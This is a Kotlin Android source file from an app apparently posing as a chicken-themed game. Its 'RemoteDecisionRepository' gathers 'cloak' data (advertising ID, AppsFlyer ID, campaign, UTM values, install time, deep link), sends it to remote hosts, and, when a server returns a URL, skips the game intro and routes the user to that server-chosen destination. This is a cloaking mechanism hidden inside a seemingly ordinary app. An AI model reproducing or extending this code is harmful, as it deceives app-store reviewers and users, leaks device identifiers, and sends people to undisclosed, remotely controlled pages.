package com.chicken.egglightsaga.data.decision

import android.content.Context
import android.util.Log
import com.chicken.egglightsaga.domain.model.DecisionInput
import com.chicken.egglightsaga.domain.model.DecisionResult
import com.chicken.egglightsaga.domain.repository.DecisionRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.HttpUrl
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class RemoteDecisionRepository
@Inject
constructor(private val client: OkHttpClient, @ApplicationContext private val context: Context) :
        DecisionRepository {

    companion object {
        private const val TAG = "RemoteDecisionRepo"
        private const val BASE_URL = "https://wizard-eggsaga.fun/api/v11c"
        private const val BUNDLE_ID = "com.chicken.egglightsaga"
    }

    override suspend fun getDecision(input: DecisionInput): DecisionResult {
        val USE_TEST  = true

        if (USE_TEST ) {
            return getTestDecision(input)
        }

        return withContext(Dispatchers.IO) {
            try {
                val queryUrl = buildUrl(input)

                Log.d(TAG, "---------------------------------------")
                Log.d(TAG, "REQUEST START")
                Log.d(TAG, "URL: $queryUrl")

                val request = Request.Builder().url(queryUrl).get().build()

                Log.d(TAG, "HEADERS:")
                request.headers.forEach { h -> Log.d(TAG, "${h.first}: ${h.second}") }

                val response = client.newCall(request).execute()

                Log.d(TAG, "---------------------------------------")
                Log.d(TAG, "RESPONSE CODE: ${response.code}")

                val bodyString = response.body?.string().orEmpty()
                Log.d(TAG, "BODY: $bodyString")

                if (!response.isSuccessful) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "HTTP error ${response.code}"
                    )
                }

                if (bodyString.isBlank()) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "Empty server response"
                    )
                }

                val json = JSONObject(bodyString)
                val url = json.optString("url", "")

                if (url.isBlank()) {
                    return@withContext DecisionResult(
                            is_intro_completed = true,
                            targetUrl = null,
                            reason = "No URL in server response"
                    )
                }

                DecisionResult(is_intro_completed = false, targetUrl = url, reason = "Server URL")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Exception: ${e.message}", e)

                DecisionResult(
                        is_intro_completed = true,
                        targetUrl = null,
                        reason = "Exception: ${e.message}"
                )
            }
        }
    }

    //-----------------------------------------------
    // TEST API CALL (RAMIRES)
    //-----------------------------------------------
    private suspend fun getTestDecision(input: DecisionInput): DecisionResult =
        withContext(Dispatchers.IO) {
            try {
                val cloak = input.cloakInfo

                val advertisingId = cloak.advertisingId ?: ""
                val appsflyerId = cloak.appsflyerDeviceId ?: ""
                val campaign = cloak.campaign ?: ""
                val utmSource = cloak.utmSource ?: ""
                val utmMedium = cloak.utmMedium ?: ""
                val installTime = cloak.installTime ?: ""
                val deepLink = cloak.deepLink ?: ""

                // ---- URL builder ----
                val testUrl = HttpUrl.Builder()
                    .scheme("https")
                    .host("device-and.site")
                    .addPathSegment("api.php")
                    .addQueryParameter("bundle_id", BUNDLE_ID)
                    .addQueryParameter("advertising_id", advertisingId)
                    .addQueryParameter("appsflyer_device_id", appsflyerId)
                    .addQueryParameter("campaign", campaign)
                    .addQueryParameter("utm_source", utmSource)
                    .addQueryParameter("utm_medium", utmMedium)
                    .addQueryParameter("install_time", installTime)
                    .addQueryParameter("deep", deepLink)
                    .build()
                    .toString()

                Log.d(TAG, "TEST REQUEST: $testUrl")

                val request = Request.Builder()
                    .url(testUrl)
                    .get()
                    .build()

                val response = client.newCall(request).execute()
                val bodyString = response.body?.string().orEmpty()

                Log.d(TAG, "TEST RESPONSE CODE: ${response.code}")
                Log.d(TAG, "TEST BODY: $bodyString")

                if (!response.isSuccessful || bodyString.isBlank()) {
                    return@withContext DecisionResult(
                        is_intro_completed = true,
                        targetUrl = null,
                        reason = "Test API error ${response.code}"
                    )
                }

                val json = JSONObject(bodyString)

                val url = json.optString("url", "")
                val visitorId = json.optString("visitor_id", "")

                if (url.isBlank()) {
                    return@withContext DecisionResult(
                        is_intro_completed = true,
                        targetUrl = null,
                        reason = "Test API: no url in response"
                    )
                }

                return@withContext DecisionResult(
                    is_intro_completed = false,
                    targetUrl = url,
                    reason = "Test API success (visitor=$visitorId)"
                )

            } catch (e: Exception) {
                Log.e(TAG, "❌ Test API exception: ${e.message}", e)
                return@withContext DecisionResult(
                    is_intro_completed = true,
                    targetUrl = null,
                    reason = "Test API exception: ${e.message}"
                )
            }
        }


    private fun buildUrl(input: DecisionInput): String {
        val cloak = input.cloakInfo

        val advertisingId = cloak.advertisingId ?: ""
        val appsflyerId = cloak.appsflyerDeviceId ?: ""
        val campaign = cloak.campaign ?: ""
        val utmSource = cloak.utmSource ?: ""
        val utmMedium = cloak.utmMedium ?: ""
        val installTime = cloak.installTime ?: ""
        val deepLink = cloak.deepLink ?: ""

        val url =
                HttpUrl.Builder()
                        .scheme("https")
                        .host("wizard-eggsaga.fun")
                        .addPathSegments("api/v11c")
                        .addQueryParameter("bundle_id", BUNDLE_ID)
                        .addQueryParameter("advertising_id", advertisingId)
                        .addQueryParameter("appsflyer_device_id", appsflyerId)
                        .addQueryParameter("campaign", campaign)
                        .addQueryParameter("utm_source", utmSource)
                        .addQueryParameter("utm_medium", utmMedium)
                        .addQueryParameter("install_time", installTime)
                        .addQueryParameter("deep", deepLink)
                        .build()
                        .toString()

        Log.d(TAG, "BUILT URL: $url")
        return url
    }
}
